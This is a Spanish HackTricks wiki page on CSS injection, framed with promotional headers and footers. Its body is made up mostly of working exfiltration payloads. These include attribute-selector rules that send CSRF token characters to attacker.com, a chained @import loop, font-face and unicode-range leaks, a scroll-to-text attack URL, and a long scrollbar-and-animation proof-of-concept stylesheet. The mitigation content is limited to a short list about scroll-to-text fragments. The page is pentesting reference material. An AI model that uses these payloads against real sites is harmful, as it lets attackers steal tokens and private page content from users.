# Inyecci√≥n de CSS

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Grupo de Seguridad Try Hard**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Inyecci√≥n de CSS

### Selector de Atributos

Los selectores CSS est√°n dise√±ados para coincidir con los valores de los atributos `name` y `value` de un elemento `input`. Si el atributo de valor del elemento de entrada comienza con un car√°cter espec√≠fico, se carga un recurso externo predefinido:
```css
input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
```
Sin embargo, este enfoque se enfrenta a una limitaci√≥n al tratar con elementos de entrada ocultos (`type="hidden"`) porque los elementos ocultos no cargan fondos.

#### Bypass para Elementos Ocultos

Para evitar esta limitaci√≥n, puedes apuntar a un elemento hermano posterior usando el combinador de hermanos generales `~`. La regla CSS entonces se aplica a todos los hermanos que siguen al elemento de entrada oculto, haciendo que la imagen de fondo se cargue:
```css
input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
Un ejemplo pr√°ctico de explotar esta t√©cnica se detalla en el fragmento de c√≥digo proporcionado. Puedes verlo [aqu√≠](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e).

#### Requisitos previos para la Inyecci√≥n de CSS

Para que la t√©cnica de Inyecci√≥n de CSS sea efectiva, se deben cumplir ciertas condiciones:

1. **Longitud de la carga √∫til**: El vector de inyecci√≥n de CSS debe admitir cargas √∫tiles lo suficientemente largas para acomodar los selectores elaborados.
2. **Reevaluaci√≥n de CSS**: Debes tener la capacidad de enmarcar la p√°gina, lo cual es necesario para desencadenar la reevaluaci√≥n de CSS con cargas √∫tiles reci√©n generadas.
3. **Recursos externos**: La t√©cnica asume la capacidad de utilizar im√°genes alojadas externamente. Esto podr√≠a estar restringido por la Pol√≠tica de Seguridad de Contenido (CSP) del sitio.

### Selector de Atributo Ciego

Como se [**explica en esta publicaci√≥n**](https://portswigger.net/research/blind-css-exfiltration), es posible combinar los selectores **`:has`** y **`:not`** para identificar contenido incluso de elementos ciegos. Esto es muy √∫til cuando no tienes idea de lo que hay dentro de la p√°gina web que carga la inyecci√≥n de CSS.\
Tambi√©n es posible utilizar esos selectores para extraer informaci√≥n de varios bloques del mismo tipo como en:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```
Combinando esto con la siguiente t√©cnica **@import**, es posible exfiltrar mucha **informaci√≥n utilizando inyecci√≥n de CSS desde p√°ginas ciegas con** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**

### @import

La t√©cnica anterior tiene algunas limitaciones, verifica los requisitos previos. Necesitas poder **enviar m√∫ltiples enlaces a la v√≠ctima**, o necesitas poder **incrustar la p√°gina vulnerable a la inyecci√≥n de CSS en un iframe**.

Sin embargo, hay otra t√©cnica ingeniosa que utiliza **CSS `@import`** para mejorar la calidad de la t√©cnica.

Esto fue mostrado por primera vez por [**Pepe Vila**](https://vwzq.net/slides/2019-s3\_css\_injection\_attacks.pdf) y funciona de la siguiente manera:

En lugar de cargar la misma p√°gina una y otra vez con decenas de cargas diferentes cada vez (como en la t√©cnica anterior), vamos a **cargar la p√°gina solo una vez y solo con una importaci√≥n al servidor del atacante** (este es el payload a enviar a la v√≠ctima):
```css
@import url('//attacker.com:5001/start?');
```
1. La importaci√≥n va a **recibir un script CSS** de los atacantes y el **navegador lo cargar√°**.
2. La primera parte del script CSS que enviar√° el atacante es **otro `@import` al servidor de los atacantes nuevamente**.
3. El servidor de los atacantes no responder√° esta solicitud a√∫n, ya que queremos filtrar algunos caracteres y luego responder a esta importaci√≥n con el payload para filtrar los siguientes.
4. La segunda y m√°s grande parte del payload va a ser un **payload de filtraci√≥n de selector de atributos**.
5. Esto enviar√° al servidor de los atacantes el **primer car√°cter del secreto y el √∫ltimo**.
6. Una vez que el servidor de los atacantes haya recibido el **primer y √∫ltimo car√°cter del secreto**, responder√° a la importaci√≥n solicitada en el paso 2.
7. La respuesta va a ser exactamente la misma que los **pasos 2, 3 y 4**, pero esta vez intentar√° **encontrar el segundo car√°cter del secreto y luego el pen√∫ltimo**.

El atacante seguir√° ese bucle hasta que logre filtrar completamente el secreto.

Puedes encontrar el [**c√≥digo de Pepe Vila para explotar esto aqu√≠**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) o puedes encontrar casi el [**mismo c√≥digo pero comentado aqu√≠**.](./#css-injection)

{% hint style="info" %}
El script intentar√° descubrir 2 caracteres cada vez (desde el principio y desde el final) porque el selector de atributos permite hacer cosas como:
```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```
Esto permite que el script filtre la informaci√≥n secreta m√°s r√°pido.
{% endhint %}

{% hint style="warning" %}
A veces el script **no detecta correctamente que el prefijo + sufijo descubierto ya es la bandera completa** y continuar√° hacia adelante (en el prefijo) y hacia atr√°s (en el sufijo) y en alg√∫n momento se quedar√° colgado.\
No te preocupes, solo verifica la **salida** porque **puedes ver la bandera all√≠**.
{% endhint %}

### Otros selectores

Otras formas de acceder a partes del DOM con **selectores CSS**:

* **`.clase-a-buscar:nth-child(2)`**: Esto buscar√° el segundo elemento con la clase "clase-a-buscar" en el DOM.
*   Selector **`:empty`**: Utilizado por ejemplo en [**este informe**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**

```css
[role^="img"][aria-label="1"]:empty { background-image: url("TU_URL_DEL_SERVIDOR?1"); }
```

### XS-Search basado en errores

**Referencia:** [Ataque basado en CSS: Abuso de unicode-range de @font-face](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [PoC de XS-Search basado en errores por @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

La intenci√≥n general es **utilizar una fuente personalizada desde un punto final controlado** y asegurarse de que **el texto (en este caso, 'A') se muestre con esta fuente solo si el recurso especificado (`favicon.ico`) no se puede cargar**.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face{
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

</style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **Uso de Fuente Personalizada**:
   - Una fuente personalizada se define utilizando la regla `@font-face` dentro de una etiqueta `<style>` en la secci√≥n `<head>`.
   - La fuente se llama `poc` y se obtiene de un punto final externo (`http://attacker.com/?leak`).
   - La propiedad `unicode-range` se establece en `U+0041`, apuntando al car√°cter Unicode espec√≠fico 'A'.

2. **Elemento de Objeto con Texto de Respaldo**:
   - Se crea un elemento `<object>` con `id="poc0"` en la secci√≥n `<body>`. Este elemento intenta cargar un recurso desde `http://192.168.0.1/favicon.ico`.
   - El `font-family` para este elemento se establece en `'poc'`, como se define en la secci√≥n `<style>`.
   - Si el recurso (`favicon.ico`) no se carga correctamente, se muestra el contenido de respaldo (la letra 'A') dentro de la etiqueta `<object>`.
   - El contenido de respaldo ('A') se renderizar√° utilizando la fuente personalizada `poc` si el recurso externo no se puede cargar.

### Estilizando Fragmento de Desplazamiento a Texto

La pseudo-clase **`:target`** se emplea para seleccionar un elemento dirigido por un **fragmento de URL**, como se especifica en la [especificaci√≥n de Selectores CSS Nivel 4](https://drafts.csswg.org/selectors-4/#the-target-pseudo). Es crucial entender que `::target-text` no coincide con ning√∫n elemento a menos que el texto est√© dirigido expl√≠citamente por el fragmento.

Surge una preocupaci√≥n de seguridad cuando los atacantes explotan la funci√≥n de fragmento de **Desplazamiento a texto**, lo que les permite confirmar la presencia de un texto espec√≠fico en una p√°gina web al cargar un recurso desde su servidor a trav√©s de una inyecci√≥n HTML. El m√©todo implica inyectar una regla CSS como esta:
```css
:target::before { content : url(target.png) }
```
En tales escenarios, si el texto "Administrador" est√° presente en la p√°gina, se solicita el recurso `target.png` desde el servidor, lo que indica la presencia del texto. Una instancia de este ataque se puede ejecutar a trav√©s de una URL especialmente dise√±ada que incrusta el CSS inyectado junto con un fragmento de desplazamiento de texto:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
Aqu√≠, el ataque manipula la inyecci√≥n de HTML para transmitir el c√≥digo CSS, apuntando al texto espec√≠fico "Administrador" a trav√©s del fragmento Scroll-to-text (`#:~:text=Administrador`). Si se encuentra el texto, se carga el recurso indicado, se√±alando inadvertidamente su presencia al atacante.

Para la mitigaci√≥n, se deben tener en cuenta los siguientes puntos:

1. **Coincidencia STTF Restringida**: El Fragmento Scroll-to-text (STTF) est√° dise√±ado para coincidir solo con palabras o frases, limitando as√≠ su capacidad para filtrar secretos o tokens arbitrarios.
2. **Restricci√≥n a Contextos de Navegaci√≥n de Nivel Superior**: STTF opera √∫nicamente en contextos de navegaci√≥n de nivel superior y no funciona dentro de iframes, lo que hace que cualquier intento de explotaci√≥n sea m√°s notable para el usuario.
3. **Necesidad de Activaci√≥n del Usuario**: STTF requiere un gesto de activaci√≥n del usuario para operar, lo que significa que las explotaciones son factibles solo a trav√©s de navegaciones iniciadas por el usuario. Este requisito mitiga considerablemente el riesgo de que los ataques se automatizen sin interacci√≥n del usuario. Sin embargo, el autor del blog se√±ala condiciones y bypasses espec√≠ficos (por ejemplo, ingenier√≠a social, interacci√≥n con extensiones de navegador prevalentes) que podr√≠an facilitar la automatizaci√≥n del ataque.

La conciencia de estos mecanismos y vulnerabilidades potenciales es clave para mantener la seguridad web y protegerse contra t√°cticas explotadoras similares.

Para obtener m√°s informaci√≥n, consulta el informe original: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

Puedes verificar un [**exploit que utiliza esta t√©cnica para un CTF aqu√≠**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

Puedes especificar **fuentes externas para valores unicode espec√≠ficos** que solo se **reunir√°n si esos valores unicode est√°n presentes** en la p√°gina. Por ejemplo:
```html
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```
Cuando accedes a esta p√°gina, Chrome y Firefox recuperan "?A" y "?B" porque el nodo de texto de informaci√≥n sensible contiene los caracteres "A" y "B". Pero Chrome y Firefox no recuperan "?C" porque no contiene "C". Esto significa que hemos podido leer "A" y "B".

### Exfiltraci√≥n de nodo de texto (I): ligaduras <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**Referencia:** [Wykradanie danych w ≈õwietnym stylu ‚Äì czyli jak wykorzystaƒá CSS-y do atak√≥w na webaplikacjƒô](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

La t√©cnica descrita implica extraer texto de un nodo explotando las ligaduras de fuentes y monitoreando cambios en el ancho. El proceso implica varios pasos:

1. **Creaci√≥n de fuentes personalizadas**:
- Se crean fuentes SVG con glifos que tienen un atributo `horiz-adv-x`, que establece un ancho grande para un glifo que representa una secuencia de dos caracteres.
- Ejemplo de glifo SVG: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, donde "XY" denota una secuencia de dos caracteres.
- Estas fuentes luego se convierten al formato woff utilizando fontforge.

2. **Detecci√≥n de cambios de ancho**:
- Se utiliza CSS para asegurar que el texto no se envuelva (`white-space: nowrap`) y para personalizar el estilo de la barra de desplazamiento.
- La aparici√≥n de una barra de desplazamiento horizontal, estilizada de manera distintiva, act√∫a como un indicador (or√°culo) de que una ligadura espec√≠fica, y por lo tanto una secuencia de caracteres espec√≠fica, est√° presente en el texto.
- El CSS involucrado:
```css
body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://attacker.com/?leak); }
```

3. **Proceso de explotaci√≥n**:
- **Paso 1**: Se crean fuentes para pares de caracteres con un ancho sustancial.
- **Paso 2**: Se emplea un truco basado en la barra de desplazamiento para detectar cu√°ndo se renderiza el glifo de ancho grande (ligadura para un par de caracteres), indicando la presencia de la secuencia de caracteres.
- **Paso 3**: Al detectar una ligadura, se generan nuevos glifos que representan secuencias de tres caracteres, incorporando el par detectado y agregando un car√°cter anterior o posterior.
- **Paso 4**: Se lleva a cabo la detecci√≥n de la ligadura de tres caracteres.
- **Paso 5**: El proceso se repite, revelando progresivamente todo el texto.

4. **Optimizaci√≥n**:
- El m√©todo actual de inicializaci√≥n utilizando `<meta refresh=...` no es √≥ptimo.
- Un enfoque m√°s eficiente podr√≠a implicar el truco `@import` de CSS, mejorando el rendimiento del exploit.

### Exfiltraci√≥n de nodo de texto (II): filtrando el conjunto de caracteres con una fuente predeterminada (sin necesidad de activos externos) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Referencia:** [PoC usando Comic Sans por @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

Este truco fue publicado en este [**hilo de Slackers**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with\_single\_css\_injection/). El conjunto de caracteres utilizado en un nodo de texto puede filtrarse **utilizando las fuentes predeterminadas** instaladas en el navegador: no se necesitan fuentes externas ni personalizadas.

El concepto gira en torno a utilizar una animaci√≥n para expandir incrementalmente el ancho de un `div`, permitiendo que un car√°cter a la vez haga la transici√≥n de la parte 'sufijo' del texto a la parte 'prefijo'. Este proceso divide efectivamente el texto en dos secciones:

1. **Prefijo**: La l√≠nea inicial.
2. **Sufijo**: La(s) l√≠nea(s) subsiguiente(s).

Las etapas de transici√≥n de los caracteres aparecer√≠an de la siguiente manera:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**


Durante esta transici√≥n, se emplea el **truco de rango unicode** para identificar cada nuevo car√°cter a medida que se une al prefijo. Esto se logra cambiando la fuente a Comic Sans, que es notablemente m√°s alta que la fuente predeterminada, lo que desencadena indirectamente una barra de desplazamiento vertical. La aparici√≥n de esta barra de desplazamiento revela indirectamente la presencia de un nuevo car√°cter en el prefijo.

Aunque este m√©todo permite la detecci√≥n de caracteres √∫nicos a medida que aparecen, no especifica qu√© car√°cter se repite, solo que se ha producido una repetici√≥n.

{% hint style="info" %}
B√°sicamente, el **rango unicode se utiliza para detectar un car√°cter**, pero como no queremos cargar una fuente externa, necesitamos encontrar otra forma.\
Cuando se **encuentra** el **car√°cter**, se le asigna la **fuente Comic Sans preinstalada**, lo que hace que el car√°cter sea **m√°s grande** y **activa una barra de desplazamiento** que **filtrar√° el car√°cter encontrado**.
{% endhint %}

Verifica el c√≥digo extra√≠do del PoC:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
```css
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* canal lateral */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### Exfiltraci√≥n de nodos de texto (III): filtrar el conjunto de caracteres con una fuente predeterminada al ocultar elementos (sin necesidad de activos externos) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Referencia:** Esto se menciona como [una soluci√≥n no exitosa en este informe](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Este caso es muy similar al anterior, sin embargo, en este caso el objetivo de hacer que caracteres espec√≠ficos sean m√°s grandes que otros es ocultar algo, como un bot√≥n para que no sea presionado por el bot o una imagen que no se cargar√°. As√≠ que podr√≠amos medir la acci√≥n (o la falta de acci√≥n) y saber si un car√°cter espec√≠fico est√° presente dentro del texto.

### Exfiltraci√≥n de nodos de texto (III): filtrar el conjunto de caracteres por temporizaci√≥n de cach√© (sin necesidad de activos externos) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Referencia:** Esto se menciona como [una soluci√≥n no exitosa en este informe](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

En este caso, podr√≠amos intentar filtrar si un car√°cter est√° en el texto cargando una fuente falsa desde el mismo origen:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
Si hay una coincidencia, la **fuente se cargar√° desde `/static/bootstrap.min.css?q=1`**. Aunque no se cargar√° con √©xito, el **navegador deber√≠a almacenarla en cach√©**, e incluso si no hay cach√©, hay un mecanismo de **304 not modified**, por lo que la **respuesta deber√≠a ser m√°s r√°pida** que otras cosas.

Sin embargo, si la diferencia de tiempo entre la respuesta en cach√© y la que no est√° en cach√© no es lo suficientemente grande, esto no ser√° √∫til. Por ejemplo, el autor mencion√≥: Sin embargo, despu√©s de hacer pruebas, descubr√≠ que el primer problema es que la velocidad no es muy diferente, y el segundo problema es que el bot utiliza la bandera `disk-cache-size=1`, lo cual es realmente considerado.

### Exfiltraci√≥n de nodos de texto (III): filtrar el conjunto de caracteres cronometrando la carga de cientos de "fuentes" locales (sin necesidad de activos externos) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Referencia:** Esto se menciona como [una soluci√≥n no exitosa en este informe](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

En este caso, puedes indicar **CSS para cargar cientos de fuentes falsas** desde el mismo origen cuando se produce una coincidencia. De esta manera puedes **medir el tiempo** que lleva y averiguar si un car√°cter aparece o no con algo como:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
Y el c√≥digo del bot se ve as√≠:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
Entonces, si la fuente no coincide, se espera que el tiempo de respuesta al visitar el bot sea de aproximadamente 30 segundos. Sin embargo, si hay una coincidencia de fuentes, se enviar√°n m√∫ltiples solicitudes para recuperar la fuente, lo que provocar√° una actividad continua en la red. Como resultado, tomar√° m√°s tiempo satisfacer la condici√≥n de parada y recibir la respuesta. Por lo tanto, el tiempo de respuesta se puede utilizar como indicador para determinar si hay una coincidencia de fuentes.

## Referencias

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
